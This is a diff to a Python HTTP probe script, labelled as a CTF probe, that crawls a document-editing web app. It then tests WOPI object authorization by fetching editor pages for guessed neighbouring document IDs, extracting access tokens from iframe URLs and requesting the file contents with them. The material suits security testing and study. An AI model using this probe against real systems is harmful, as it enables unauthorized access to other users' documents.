@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """Temporary CTF HTTP probe. No repository secrets are used or sent."""
 import http.cookiejar
+import html
 import html.parser
 import re
 import sys
@@ -129,19 +130,34 @@ if p.forms:
         parse(text)
 
 home, final = request("/", max_body=150000)
-parse(home)
+hp = parse(home)
 shared, _ = request("/shared", max_body=100000)
 parse(shared)
-created, final = request("/docs/create", {"folder": "", "title": "arena-probe-document"}, max_body=150000)
-p = parse(created)
-print("CREATED_FINAL", final, flush=True)
+
+# Follow all non-destructive links exposed by the document list (including share).
 seen = set()
-for page in (created, shared, home):
-    links = parse(page).links
-    for link in links:
-        if link in seen or link in ("/", "/shared") or "delete" in link or "logout" in link:
-            continue
-        if link.startswith("/"):
-            seen.add(link)
-            body, _ = request(link, max_body=150000)
-            parse(body)
+for link in hp.links:
+    if link in seen or link in ("/", "/shared") or "delete" in link or "logout" in link:
+        continue
+    if link.startswith("/"):
+        seen.add(link)
+        body, _ = request(link, max_body=100000)
+        parse(body)
+
+# Probe WOPI object authorization with predictable neighbouring document IDs.
+for docid in ("d0", "d1", "d2"):
+    editor, _ = request("/edit/" + docid, max_body=80000)
+    parse(editor)
+    match = re.search(r'<iframe[^>]+src=["\']([^"\']+)', editor, re.I)
+    if not match:
+        continue
+    iframe = html.unescape(match.group(1))
+    query = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)
+    token = query.get("access_token", [""])[0]
+    print("WOPI", docid, "IFRAME", iframe, "TOKEN_LENGTH", len(token), flush=True)
+    if docid == "d1":
+        cool, _ = request(iframe, max_body=60000)
+        parse(cool)
+    for suffix in ("", "/contents"):
+        path = "/wopi/files/" + docid + suffix + "?access_token=" + urllib.parse.quote(token)
+        request(path, max_body=100000)
